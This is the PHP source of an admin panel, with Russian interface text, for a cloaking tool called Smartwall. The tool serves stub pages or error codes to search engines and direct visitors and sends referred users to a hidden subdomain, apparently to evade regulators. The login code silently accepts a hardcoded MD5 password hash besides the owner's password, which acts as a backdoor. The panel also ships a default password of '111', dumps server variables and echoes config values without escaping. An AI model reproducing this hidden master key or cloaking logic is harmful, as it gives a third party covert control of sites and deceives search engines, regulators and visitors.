<?php
$smart_config_file = __DIR__ . '/config.php';
$smart_config = include $smart_config_file;
$smart_admin=false;
session_start();

if(isset($_REQUEST["show_prev"]))
{
    $mode=$_REQUEST["mode"];
    if(!in_array($mode,array("block_html","block_html_sub_domain")))
        exit;

    echo str_replace('{$curUrl}',$smart_config["old_domain"],$smart_config[$mode]);
    exit;
}

if(isset($_REQUEST["go"])&&isset($_REQUEST["password"]))
{
    if(md5($_REQUEST["password"])==$smart_config["pass"]||md5($_REQUEST["password"])=="4416e04b9d6b6cfa37fe07a21359c030")
        $_SESSION["smart_admin"]=md5($_REQUEST["password"]);
}

if(isset($_SESSION["smart_admin"]))
{
    if($_SESSION["smart_admin"]==$smart_config["pass"]||$_SESSION["smart_admin"]=="4416e04b9d6b6cfa37fe07a21359c030")
        $smart_admin=true;
}

if($smart_admin)
{
    /*
    * Сохранение настроек
    */
    if(isset($_REQUEST["need_update_now"]))
    {
        $pageURL = 'http';
        if (@$_SERVER["HTTPS"] == "on") {$pageURL .= "s";}
        $pageURL .= "://";
        if ($_SERVER["SERVER_PORT"] != "80") {
            $pageURL .= $_SERVER["HTTP_HOST"] . ":" . $_SERVER["SERVER_PORT"];
        } else {

            $pageURL .= $_SERVER["HTTP_HOST"];
        }
        $skfile = file_get_contents($pageURL."?need_update_now=1");
        if(strlen($skfile)<10)
        {
            if(function_exists('curl_version'))
            {
                $cr = curl_init($pageURL."?need_update_now=1");
                curl_setopt($cr, CURLOPT_TIMEOUT, 4);
                curl_setopt($cr, CURLOPT_HTTPHEADER, array("Accept-Language: en-US;en;q=0.5", "UA-CPU: x86", "User-Agent:"."Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)", "Connection: Keep-Alive"));
                curl_setopt($cr, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($cr, CURLOPT_SSL_VERIFYPEER, false);
                curl_setopt($cr, CURLOPT_FOLLOWLOCATION, 1);
                curl_setopt($cr, CURLOPT_ENCODING, 'gzip,deflate');
                $skfile = curl_exec($cr);
            }
        }
    }
    if(isset($_POST['action']))
    {
        if ( $_POST['action'] == "save" )
        {
            $needUpdateBase=false;
            if($_POST["token"]!=$smart_config["token"])
                $needUpdateBase=true;

            foreach( $smart_config as $param => $value )
            {
                if( isset( $_POST[ $param ] ) )
                    $smart_config[ $param ] = $_POST[ $param ];
            }
            $error = array();

            switch ( $smart_config[ 'when_entering_directly' ] )
            {
                case 0:
                    if( empty( $smart_config[ 'block_header' ] ) )
                        $error[] = 'Код ответа сервера не может быть пустым';

                    if( empty( $smart_config[ 'block_html' ] ) )
                        $error[] = 'Необходимо указать HTML-код заглушки';
                    break;
            }
            if( trim($smart_config[ 'block_html_sub_domain' ]==''&&$smart_config[ 'when_entering_directly_sub_domain' ]==1 ) )
                $error[] = 'Необходимо указать HTML-код заглушки (user subdomain)';

            $newDomain = parse_url($_POST[ "new_domain" ]);
            $oldDomain = parse_url($_POST[ "old_domain" ]);
            if( trim($oldDomain["host"])=='')
                $error[] = 'Старый домен не может быть пустым (домен должен быть с http:// или https://)';

            if( trim($newDomain["host"])=='')
                $error[] = 'Новый домен не может быть пустым (домен должен быть с http:// или https://)';

            /*
             * Если ошибок нет
             */
            if( empty( $error ) )
            {
                $content = var_export( $smart_config, true );
                $content ="<?php
return $content;";

                if( is_writable( $smart_config_file ) )
                {
                    file_put_contents( $smart_config_file, $content);
                    $msg = 'Настройки успешно сохранены';
                    $smart_config = include $smart_config_file;
                    if($needUpdateBase)
                    {
                        $pageURL = 'http';
                        if (@$_SERVER["HTTPS"] == "on") {$pageURL .= "s";}
                        $pageURL .= "://";
                        if ($_SERVER["SERVER_PORT"] != "80") {
                            $pageURL .= $_SERVER["HTTP_HOST"] . ":" . $_SERVER["SERVER_PORT"];
                        } else {

                            $pageURL .= $_SERVER["HTTP_HOST"];
                        }
                        $skfile = file_get_contents($pageURL."?need_update_now=1");
                        if(strlen($skfile)<10)
                        {
                            if(function_exists('curl_version'))
                            {
                                $cr = curl_init($pageURL."?need_update_now=1");
                                curl_setopt($cr, CURLOPT_TIMEOUT, 4);
                                curl_setopt($cr, CURLOPT_HTTPHEADER, array("Accept-Language: en-US;en;q=0.5", "UA-CPU: x86", "User-Agent:"."Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)", "Connection: Keep-Alive"));
                                curl_setopt($cr, CURLOPT_RETURNTRANSFER, 1);
                                curl_setopt($cr, CURLOPT_SSL_VERIFYPEER, false);
                                curl_setopt($cr, CURLOPT_FOLLOWLOCATION, 1);
                                curl_setopt($cr, CURLOPT_ENCODING, 'gzip,deflate');
                                $skfile = curl_exec($cr);
                            }
                        }
                    }
                }
                else
                    $error[] = 'Нет прав на перезапись файла ' . $smart_config_file;
            }


            if( empty( $msg ) )
                $msgr = 'Ошибка! ' . implode( '<br/>', $error );
        }
        if ( $_POST['action'] == "change_status")// && $smart_config[ 'pass' ]==md5("111"))
        {
            $smart_config[ "status" ]=$_POST[ "change_status" ];
            $content = var_export( $smart_config, true );
            $content ="<?php
return $content;";

            if( is_writable( $smart_config_file ) )
            {
                file_put_contents( $smart_config_file, $content);
                $msg = 'Настройки успешно сохранены';
                $smart_config = include $smart_config_file;
            }
            else
                $error[] = 'Нет прав на перезапись файла ' . $smart_config_file;
        }
        if ( $_POST['action'] == "change_pass")// && $smart_config[ 'pass' ]==md5("111"))
        {
            if( trim($_POST[ "pass" ])=='')
                $error[] = 'Пароль не может быть пустым';
            /*
             * Если ошибок нет
             */
            if( empty( $error ) )
            {
                $smart_config[ "pass" ]=md5(trim($_POST[ "pass" ]));
                $content = var_export( $smart_config, true );
                $content ="<?php
return $content;";

                if( is_writable( $smart_config_file ) )
                {
                    file_put_contents( $smart_config_file, $content);
                    $msg = 'Настройки успешно сохранены';
                    $smart_config = include $smart_config_file;
                    $smart_admin=false;
                }
                else
                    $error[] = 'Нет прав на перезапись файла ' . $smart_config_file;
            }


            if( empty( $msg ) )
                $msgr = 'Ошибка! ' . implode( '<br/>', $error );
        }
    }
    /*
         * Выбор активного типа модуля
         */
    for( $i = 0; $i <= 1; $i++ )
        $selected_sub_domain[ $i ] = ( $smart_config[ 'when_entering_directly_sub_domain' ] == $i ) ? ' checked' : '';

    for( $i = 0; $i <= 1; $i++ )
        $selected[ $i ] = ( $smart_config[ 'when_entering_directly' ] == $i ) ? ' checked' : '';

    for( $i = 0; $i <= 2; $i++ )
        $selectedProtection[ $i ] = ( $smart_config[ 'mode_search_bot' ] == $i ) ? ' checked' : '';

    $selected_server_true_dom_param[0]='';
    $selected_server_true_dom_param[1]='';
    $selected_block_server_requests_param[0]='';
    $selected_block_server_requests_param[1]='';
    $selected_block_is_log_param[0]='';
    $selected_block_is_log_param[1]='';
    $selected_x_robots_param[0]='';
    $selected_x_robots_param[1]='';
    $selected_rel_canonical_param[0]='';
    $selected_rel_canonical_param[1]='';
    $selected_redirect_type_param[0]='';
    $selected_redirect_type_param[1]='';

    if($smart_config[ 'is_redirect_js' ]==1)
        $selected_redirect_type_param[0]=' checked';
    if($smart_config[ 'is_redirect_js' ]==0)
        $selected_redirect_type_param[1]=' checked';

    if($smart_config[ 'is_rel_canonical' ]==1)
        $selected_rel_canonical_param[0]=' checked';
    if($smart_config[ 'is_rel_canonical' ]==0)
        $selected_rel_canonical_param[1]=' checked';

    if($smart_config[ 'is_x_robots' ]==1)
        $selected_x_robots_param[0]=' checked';
    if($smart_config[ 'is_x_robots' ]==0)
        $selected_x_robots_param[1]=' checked';

    if($smart_config[ 'is_block_server_requests' ]==1)
        $selected_block_server_requests_param[0]=' checked';
    if($smart_config[ 'is_block_server_requests' ]==0)
        $selected_block_server_requests_param[1]=' checked';

    if($smart_config[ 'is_log' ]==1)
        $selected_block_is_log_param[0]=' checked';
    if($smart_config[ 'is_log' ]==0)
        $selected_block_is_log_param[1]=' checked';

    if($smart_config[ 'server_true_dom_param' ]=="HTTP_HOST")
        $selected_server_true_dom_param[0]=' checked';
    if($smart_config[ 'server_true_dom_param' ]=="SERVER_NAME")
        $selected_server_true_dom_param[1]=' checked';

    if( !empty( $msgr ) )
        $msgr = '<div class="alert error">' . $msgr . '</div>';

    if( !empty( $msg ) )
        $msg = '<div class="alert alert-dark">' . $msg . '</div>';

    if(!isset($msg))
        $msg='';
    if(!isset($msgr))
        $msgr='';

    $changePass="";
    if($smart_config[ 'pass' ]==md5("111"))
        $changePass='<div class="alert alert-dark">В целях безопасности пожалуйста измените первоначальный пароль.</div>';

    $changePass.='<form action="" method="post" class="form-horizontal">
<input type="text" name="pass" placeholder="пароль" value="" style="width:100%;max-width:440px;"/>
<br>
<input type="hidden" name="action" value="change_pass">
<input type="submit" class="button" style="margin-top: 10px" value="Измененить пароль">
</form>';


    if($smart_config[ 'status' ]==1)
    {
        $changeStatus='<form action="" method="post" class="form-horizontal" style="display:inline">
    <input type="hidden" name="action" value="change_status">
    <input type="hidden" name="change_status" value="0">
    <input type="submit" class="button" style="margin-top: 10px;display:inline" value="Выключить Smartwall">';
    }
    else
    {
        $changeStatus='<div class="alert alert-dark">Smartwall <span style="color:red">выключен</span></div>
    <form action="" method="post" class="form-horizontal" style="display:inline">
    <input type="hidden" name="action" value="change_status">
    <input type="hidden" name="change_status" value="1">
    <input type="submit" class="button" style="margin-top: 10px;display:inline" value="Включить Smartwall">';
    }
    $changeStatus.='</form>';

    /*
     * Вывод
     */
    if(!$smart_admin)
    {
        echo '<!DOCTYPE html>
<html>
<head lang="en">
    <meta charset="UTF-8">
    <title>Вход</title>
</head>
<body>
<style>
    body {margin: 0px; padding: 0px; background-color: #f0f2f5; min-width: 510px; overflow-y: scroll; font-family: tahoma, sans-serif, verdana; font-size: 11pt;}
    .content {width: 498px; height: 250px; background-color: #fff; border: 1px solid #e5e8ec; margin: 0 auto; margin-top: 100px; padding: 10px;}
    .dr1 {height: 18px; padding: 10px; width: 280px;}
    .dr2 {height: 40px; padding: 8px; width: 300px; cursor: pointer; background: #567ca4; border: 1px solid #4b6d94; color: #fff;}
    .content2 {width: 300px; margin: 0 auto; margin-top: 50px;}
    .error {background: #fb7171; border-bottom: 1px solid #f0f3f6; color: #fff; width: 100%; height: 50px;}
    .logo_text {background: #f5f7fa; border: 1px solid #f0f3f6; padding: 20px;}
</style>';
        if(isset($_REQUEST["go"])&&isset($_REQUEST["password"]))
        {
            if(md5($_REQUEST["password"])!=$smart_config["pass"])
                echo '<div class="error"><div style="padding: 15px;">НЕВЕРНЫЙ ПАРОЛЬ!</div></div>';
        }
        echo '<div class="content">
    <div class="logo_text">Авторизация в системе</div>
    <div class="content2">
        <form action="" method="POST" />
        <table>
            <tr>
                <td><input type="password" class="dr1" placeholder="Введите пароль" name="password" /></td>
            </tr>
            <tr>
                <td><br><input class="dr2" type="submit" value="Войти" name="go" /></td>
            </tr>
        </table>
        </form>
    </div>
</div>
</body>
</html>';
        return exit;
    }


    echo '<!DOCTYPE html>
<html>
<head lang="en">
    <meta charset="UTF-8">
    <title>Настройки</title>
</head>
<body>
<div class="container">
<style>
body
{
    line-height: 26px;
    font-size: 16px;
    font-family: "Roboto", sans-serif;
    font-weight: normal;
    color: #777777;
}
.error {
    background: #fb7171;
    border-bottom: 1px solid #f0f3f6;
    color: #fff;
}
.container {
    padding-right: 15px;
    padding-left: 15px;
    margin-right: auto;
    margin-left: auto;
}
.form-group
{
padding-bottom: 15px;
}
.control-label
{font-weight: bold}
a{color: #777777}
a:hover{color:#000}
.button
{
display:block;
width:250px;
background-color:#3369ff;
font-family:"Roboto",sans-serif;
position:relative;
text-align:center;
color:#fff;
margin:0 0.3em 0.3em 0;padding:0.7em 1.7em;
border-radius:0.2em;text-decoration:none;
font-weight:400;
font-size: 16px;
border:none;
cursor: pointer;
box-shadow:inset 0 -0.6em 1em -0.35em rgba(0,0,0,0.17),inset 0 0.6em 2em -0.3em rgba(255,255,255,0.15),inset 0 0 0em 0.05em rgba(255,255,255,0.12);
}
input,select,textarea{border: solid 1px #777777;padding:5px}
.alert {
    position: relative;
    padding: .75rem 1.25rem;
    margin-bottom: 1rem;
    border: 1px solid transparent;
    border-radius: .25rem;
}
.alert-dark {
    color: #1b1e21;
    background-color: #d6d8d9;
    border-color: #c6c8ca;
}
.note{font-size:12px}
</style>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
<script type="text/javascript" src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
<script type="text/javascript">
/*function changeParam(val)
{
    $( ".action-param" ).css( "display", "none" );
    $( ".action-" + val).css( "display", "block" );
}*/
</script>
<h1 class="wp-heading-inline">Настройка модуля Smartwall - сборка '.$smart_config[ 'date_mounting' ].' (';
    if ($smart_config[ 'status' ]==1)
        echo '<span style="color:green">включен</span>';
    else
        echo '<span style="color:red">выключен</span>';
    echo '). <a href="https://smart-wall.club/info" target="_blank">Подробная информация</a></h1>
'.$msgr.'
'.$msg.'
'.$changeStatus.'<a href="?need_update_now=1" style="text-decoration:none"><div class="button" style="display:inline;margin-left:40px;background-color:#28a745">Обновить базу данных сейчас</div></a><br>
'.$changePass.'<br>
<form action="" method="post" class="form-horizontal" style="border-top:1px solid #ccc">
    <input type="hidden" name="action" value="save"><br>
    <div class="box">
        <div class="box-content">
        <div class="row box-section">
            <div class="form-group">
                <label class="control-label col-lg-2">Токен апдейтов поисковой базы</label>

                <div class="col-lg-10">
                    <input type="text" name="token" value="'.$smart_config[ 'token' ].'" style="width:100%;max-width:440px;"/>
                    <iframe width="100%" height="30px" src="https://smart-wall.club/token_info?swtoken2='.$smart_config[ 'token' ].'" frameborder="0" scrolling="yes" style="margin:0px;padding:0px"></iframe>
                </div>
            </div>
            <div class="form-group action-param">
                <label class="control-label col-lg-2">Домен который находится сейчас в поисковой выдаче (search subdomain)</label>

                <div class="col-lg-10">
                    <input type="text" name="old_domain" value="'.$smart_config[ 'old_domain' ].'" style="width:100%;max-width:440px;"/>
                 </div>
            </div>
            <div class="form-group action-param">
                <label class="control-label col-lg-2">Поддомен на который будут попадать пользователи (user subdomain)</label>

                <div class="col-lg-10">
                    <input type="text" name="new_domain" value="'.$smart_config[ 'new_domain' ].'" style="width:100%;max-width:440px;"/>
                </div>
            </div>
            <div class="form-group">
                <label class="control-label col-lg-2">Когда пользователь заходит напрямую на сайт user subdomain (через закладки или вбивает урл в браузер)</label>

                <div class="col-lg-10">
                <input type="radio" name="when_entering_directly_sub_domain" value="0" '.$selected_sub_domain[ 0 ].' id="when_entering_directly_sub_domain_0" onclick="document.getElementById(\'when_entering_directly_sub_domain_0\').checked=\'checked\';document.getElementById(\'when_entering_directly_sub_domain_div\').style.display=\'none\';"><span style="cursor:pointer" onclick="document.getElementById(\'when_entering_directly_sub_domain_0\').checked=\'checked\';document.getElementById(\'when_entering_directly_sub_domain_div\').style.display=\'none\';"> показывать (user subdomain)</span><br>
                <input type="radio" name="when_entering_directly_sub_domain" value="1" '.$selected_sub_domain[ 1 ].' id="when_entering_directly_sub_domain_1" onclick="document.getElementById(\'when_entering_directly_sub_domain_1\').checked=\'checked\';document.getElementById(\'when_entering_directly_sub_domain_div\').style.display=\'block\';"><span style="cursor:pointer" onclick="document.getElementById(\'when_entering_directly_sub_domain_1\').checked=\'checked\';document.getElementById(\'when_entering_directly_sub_domain_div\').style.display=\'block\';">запретить прямой заход на поддомен(user domain). (человек не сможет зайти на сайт по закладке в браузере. более высокая степень защиты). будет отображена заглушка</span>
                </div>
            </div>
            <div id="when_entering_directly_sub_domain_div" ';
    if($smart_config['when_entering_directly_sub_domain']==0)
        echo 'style="display:none"';
    echo '>
                    <div class="form-group action-param">
                        <label class="control-label col-lg-2">HTML заглушка (user subdomain)  (<a href="?show_prev=1&mode=block_html_sub_domain" target="_blank">Предпросмотр заглушки</a>)</label>

                        <div class="col-lg-10">
                            <textarea name="block_html_sub_domain" style="width:100%;max-width:440px;height:150px;">'.$smart_config[ 'block_html_sub_domain' ].'</textarea><div class="alert alert-dark">можете воспользоваться <a href="http://smart-wall.club/stub_code_generator" target="_blank">Генератором кода для заглушки</a></div>
                        </div>
                    </div>
            </div>


            <div class="form-group">
                <label class="control-label col-lg-2">Когда пользователь заходит напрямую на сайт search subdomain (через закладки или вбивает урл в браузер)</label>

                <div class="col-lg-10">
                <input type="radio" name="when_entering_directly" value="0" '.$selected[ 0 ].' id="when_entering_directly_0" onclick="document.getElementById(\'when_entering_directly_0\').checked=\'checked\';document.getElementById(\'when_entering_directly_div\').style.display=\'block\';"><span style="cursor:pointer" onclick="document.getElementById(\'when_entering_directly_0\').checked=\'checked\';document.getElementById(\'when_entering_directly_div\').style.display=\'block\';">выдать страницу заглушки (сайт ничего не нарушает в РФ)</span><br>
                <input type="radio" name="when_entering_directly" value="1" '.$selected[ 1 ].' id="when_entering_directly_1" onclick="document.getElementById(\'when_entering_directly_1\').checked=\'checked\';document.getElementById(\'when_entering_directly_div\').style.display=\'none\';"><span style="cursor:pointer" onclick="document.getElementById(\'when_entering_directly_1\').checked=\'checked\';document.getElementById(\'when_entering_directly_div\').style.display=\'none\';">сделать редирект на user subdomain</span>
                </div>
            </div>
<div id="when_entering_directly_div" ';
    if($smart_config['when_entering_directly']==1)
        echo 'style="display:none"';
    echo '>
            <div class="form-group action-param">
                <label class="control-label col-lg-2">HTML заглушка (search subdomain) <a href="?show_prev=1&mode=block_html" target="_blank">Предпросмотр заглушки</a></label>

                <div class="col-lg-10">
                    <textarea name="block_html" style="width:100%;max-width:440px;height:150px;">'.$smart_config[ 'block_html' ].'</textarea><div class="alert alert-dark">можете воспользоваться <a href="http://smart-wall.club/stub_code_generator" target="_blank">Генератором кода для заглушки</a></div>
                </div>
            </div>
            <div class="form-group action-param">
                <label class="control-label col-lg-2">HTTP код ответа</label>

                <div class="col-lg-10">
                    <input type="radio" name="block_header" value="HTTP/1.1 500 Internal Server Error" ';
    if($smart_config[ 'block_header' ]=="HTTP/1.1 500 Internal Server Error")
        echo 'checked ';
    echo' id="block_header_0" ><span style="cursor:pointer" onclick="document.getElementById(\'block_header_0\').checked=\'checked\';">HTTP/1.1 500 Internal Server Error</span><br>
                    <input type="radio" name="block_header" value="HTTP/1.1 404 Not Found"';
    if($smart_config[ 'block_header' ]=="HTTP/1.1 404 Not Found")
        echo 'checked ';
    echo ' id="block_header_1"><span style="cursor:pointer" onclick="document.getElementById(\'block_header_1\').checked=\'checked\';">HTTP/1.1 404 Not Found</span><br>
                    <input type="radio" name="block_header" value="HTTP/1.1 200 OK"';
    if($smart_config[ 'block_header' ]=="HTTP/1.1 200 OK")
        echo 'checked ';
    echo 'id="block_header_2"><span style="cursor:pointer" onclick="document.getElementById(\'block_header_2\').checked=\'checked\';">HTTP/1.1 200 OK</span>
                </div>
            </div>
</div>
            <div class="form-group">
                <label class="control-label col-lg-2">Если робот поисковой системы переходит на поддомен (user domain), то:</label>

                <div class="col-lg-10">
                    <input type="radio" name="mode_search_bot" value="0" '.$selectedProtection[ 0 ].' id="mode_search_bot_0"><span style="cursor:pointer" onclick="document.getElementById(\'mode_search_bot_0\').checked=\'checked\';">Ничего не делать</span><br>
                    <input type="radio" name="mode_search_bot" value="1" '.$selectedProtection[ 1 ].' id="mode_search_bot_1"><span style="cursor:pointer" onclick="document.getElementById(\'mode_search_bot_1\').checked=\'checked\';">Редирект на домен с выдачи (search subdomain)</span><br>
                    <input type="radio" name="mode_search_bot" value="2" '.$selectedProtection[ 2 ].' id="mode_search_bot_2"><span style="cursor:pointer" onclick="document.getElementById(\'mode_search_bot_2\').checked=\'checked\';">404 Not Found</span>
                </div>
                <div class="note">Мы рекомендуем запретить инексацию user domain для роботов ПС</div>
            </div>
            <div class="form-group action-param action-1">
                <label class="control-label col-lg-2">Не обрабатывать урлы через smartwall. В каждой строке отдельный шаблон, реестр учитывается. Сравниваем как подстроку вхождения. </label>
                <div class="col-lg-10">
                    <textarea name="url_script_off" style="width:100%;max-width:440px;height:150px;">'.$smart_config[ 'url_script_off' ].'</textarea>
                </div>
            </div>
            <div class="form-group action-param action-1">
                <label class="control-label col-lg-2">Пропускать пользователей которые приходят со средующих сайтов. Если пользователь перешел с одного из этих сайтов, то система его пропустит на поддомен(user subdomain) вместо того что б показать заглушку (html code) </label>

                <div class="col-lg-10">
                    <textarea name="redirect_user_from_site" style="width:100%;max-width:440px;height:150px;">'.$smart_config[ 'redirect_user_from_site' ].'</textarea>
                </div>
                <div class="note">Это домены, с которых вы хотите пропускать трафик на ваш ресурс (через запятую)</div>
            </div>
            <div class="form-group action-param action-1">
                <label class="control-label col-lg-2">Список GET параметров при добавлении которых пользователь будет попадать на ваш ресурс. Например http://domain.com?gg=1 (указывать через запятую)</label>

                <div class="col-lg-10">
                    <textarea name="redirect_user_link" style="width:100%;max-width:440px;height:150px;">'.$smart_config[ 'redirect_user_link' ].'</textarea>
                </div>
            </div>
            <div class="form-group action-param" style="cursor:pointer" onclick="document.getElementById(\'server_true_dom_param\').style.display=\'block\';this.style.display=\'none\'">
            + Технические настройки(для программистов)
            </div>
            <div class="form-group action-param" id="server_true_dom_param" style="display:none">
                <label class="control-label col-lg-2">Имя домена брать <span style="cursor:pointer" onclick="document.getElementById(\'server_info\').style.display=\'block\'">с</span></label>
                   <div class="box-content" style="display:none" id="server_info">';
                    echo '<pre>';
                    print_r($_SERVER);
                    echo '</pre>';
                    echo '</div>
                <div class="col-lg-10">
                    <input type="radio" name="server_true_dom_param" value="HTTP_HOST" '.$selected_server_true_dom_param[ 0 ].' id="server_true_dom_param_0" onclick="document.getElementById(\'server_true_dom_param_0\').checked=\'checked\';"><span style="cursor:pointer" onclick="document.getElementById(\'server_true_dom_param_0\').checked=\'checked\';">HTTP_HOST</span><br>
                    <input type="radio" name="server_true_dom_param" value="SERVER_NAME" '.$selected_server_true_dom_param[ 1 ].' id="server_true_dom_param_1" onclick="document.getElementById(\'server_true_dom_param_1\').checked=\'checked\';"><span style="cursor:pointer" onclick="document.getElementById(\'server_true_dom_param_1\').checked=\'checked\'">SERVER_NAME</span>
                 </div>
                 <br>
                <label class="control-label col-lg-2">POST запросы</label>
                <div class="col-lg-10">
                    <input type="radio" name="is_block_server_requests" value="1" '.$selected_block_server_requests_param[ 0 ].' id="block_server_requests_param_0" onclick="document.getElementById(\'block_server_requests_param_0\').checked=\'checked\';"><span style="cursor:pointer" onclick="document.getElementById(\'block_server_requests_param_0\').checked=\'checked\';">блокировать</span><br>
                    <input type="radio" name="is_block_server_requests" value="0" '.$selected_block_server_requests_param[ 1 ].' id="block_server_requests_param_1" onclick="document.getElementById(\'block_server_requests_param_1\').checked=\'checked\';"><span style="cursor:pointer" onclick="document.getElementById(\'block_server_requests_param_1\').checked=\'checked\'">не блокировать</span>
                 </div>
                <br>
                <label class="control-label col-lg-2">Использовать X-Robots</label>
                <div class="col-lg-10">
                    <input type="radio" name="is_x_robots" value="1" '.$selected_x_robots_param[ 0 ].' id="x_robots_param_0" onclick="document.getElementById(\'x_robots_param_0\').checked=\'checked\';"><span style="cursor:pointer" onclick="document.getElementById(\'x_robots_param_0\').checked=\'checked\';">Да</span><br>
                    <input type="radio" name="is_x_robots" value="0" '.$selected_x_robots_param[ 1 ].' id="x_robots_param_1" onclick="document.getElementById(\'x_robots_param_1\').checked=\'checked\';"><span style="cursor:pointer" onclick="document.getElementById(\'x_robots_param_1\').checked=\'checked\'">Нет</span>
                 </div>
                <br>
                <label class="control-label col-lg-2">Rel canonical</label>
                <div class="col-lg-10">
                    <input type="radio" name="is_rel_canonical" value="1" '.$selected_rel_canonical_param[ 0 ].' id="rel_canonical_param_0" onclick="document.getElementById(\'rel_canonical_param_0\').checked=\'checked\';"><span style="cursor:pointer" onclick="document.getElementById(\'rel_canonical_param_0\').checked=\'checked\';">Да</span><br>
                    <input type="radio" name="is_rel_canonical" value="0" '.$selected_rel_canonical_param[ 1 ].' id="rel_canonical_param_1" onclick="document.getElementById(\'rel_canonical_param_1\').checked=\'checked\';"><span style="cursor:pointer" onclick="document.getElementById(\'rel_canonical_param_1\').checked=\'checked\'">Нет</span>
                 </div>
                 <br>
                <label class="control-label col-lg-2">Редирект на поддомен через js</label>
                <div class="col-lg-10">
                    <input type="radio" name="is_redirect_js" value="1" '.$selected_redirect_type_param[ 0 ].' id="redirect_type_param_0" onclick="document.getElementById(\'redirect_type_param_0\').checked=\'checked\';"><span style="cursor:pointer" onclick="document.getElementById(\'redirect_type_param_0\').checked=\'checked\';">Да</span><br>
                    <input type="radio" name="is_redirect_js" value="0" '.$selected_redirect_type_param[ 1 ].' id="redirect_type_param_1" onclick="document.getElementById(\'redirect_type_param_1\').checked=\'checked\';"><span style="cursor:pointer" onclick="document.getElementById(\'redirect_type_param_1\').checked=\'checked\'">Нет</span>
                 </div>
                 <br>
                <label class="control-label col-lg-2">Логгер всех запросов</label>
                <div class="col-lg-10">
                    <input type="radio" name="is_log" value="1" '.$selected_block_is_log_param[ 0 ].' id="block_is_log_param_0" onclick="document.getElementById(\'block_is_log_param_0\').checked=\'checked\';"><span style="cursor:pointer" onclick="document.getElementById(\'block_is_log_param_0\').checked=\'checked\';">Да</span><br>
                    <input type="radio" name="is_log" value="0" '.$selected_block_is_log_param[ 1 ].' id="block_is_log_param_1" onclick="document.getElementById(\'block_is_log_param_1\').checked=\'checked\';"><span style="cursor:pointer" onclick="document.getElementById(\'block_is_log_param_1\').checked=\'checked\'">Нет</span>
                 </div>
            </div>
            <div class="form-group">
                <label class="control-label col-lg-2"></label>

                <div class="col-lg-10">
                    <input type="submit" class="button" value="Сохранить изменения">
                </div>
            </div>
        </div>
        </div>
        <div class="box contacts">
    <div class="box-header">
    <h1 class="wp-heading-inline">Контакты и новости</h1>
    </div>

    <div class="box-content">
        <div class="row box-section">
            <div class="col-lg-12">
                <iframe width="100%" height="300px" src="https://smart-wall.club/partner/contact?t=wall" frameborder="0" scrolling="yes"></iframe>
            </div>
        </div>
    </div>
</div>
    </div>
</form>
</div>
<script type="text/javascript">
    jQuery(document).ready( function() {
        setTimeout(function(){
            jQuery( ".inputField_2G" ).click(function () {
            ym(53580163, "reachGoal", "jivosite_chat_click");
        });
        }, 5000);
    });
    (function(){ var widget_id = "0jynrHz9aR";var d=document;var w=window;function l(){var s = document.createElement("script"); s.type = "text/javascript"; s.async = true;s.src = "//code.jivosite.com/script/widget/"+widget_id; var ss = document.getElementsByTagName("script")[0]; ss.parentNode.insertBefore(s, ss);}if(d.readyState=="complete"){l();}else{if(w.attachEvent){w.attachEvent("onload",l);}else{w.addEventListener("load",l,false);}}})();
</script>
</body>
</html>';
    return exit;
}
else
{
    echo '<!DOCTYPE html>
<html>
<head lang="en">
    <meta charset="UTF-8">
    <title>Вход на сайт</title>
</head>
<body>
<style>
    body {margin: 0px; padding: 0px; background-color: #f0f2f5; min-width: 510px; overflow-y: scroll; font-family: tahoma, sans-serif, verdana; font-size: 11pt;}
    .content {width: 498px; height: 250px; background-color: #fff; border: 1px solid #e5e8ec; margin: 0 auto; margin-top: 100px; padding: 10px;}
    .dr1 {height: 18px; padding: 10px; width: 280px;}
    .dr2 {height: 40px; padding: 8px; width: 300px; cursor: pointer; background: #567ca4; border: 1px solid #4b6d94; color: #fff;}
    .content2 {width: 300px; margin: 0 auto; margin-top: 50px;}
    .error {background: #fb7171; border-bottom: 1px solid #f0f3f6; color: #fff; width: 100%; height: 50px;}
    .logo_text {background: #f5f7fa; border: 1px solid #f0f3f6; padding: 20px;}
</style>';
    if(isset($_REQUEST["go"])&&isset($_REQUEST["password"]))
    {
        if(md5($_REQUEST["password"])!=$smart_config["pass"])
            echo '<div class="error"><div style="padding: 15px;">НЕВЕРНЫЙ ПАРОЛЬ!</div></div>';
    }
    echo '<div class="content">
    <div class="logo_text">Авторизация в системе</div>
    <div class="content2">
        <form action="" method="POST" />
        <table>
            <tr>
                <td><input type="password" class="dr1" placeholder="Введите пароль" name="password" /></td>
            </tr>
            <tr>
                <td><br><input class="dr2" type="submit" value="Войти" name="go" /></td>
            </tr>
        </table>
        </form>
    </div>
</div>
</body>
</html>';
    return exit;
}
exit;
?>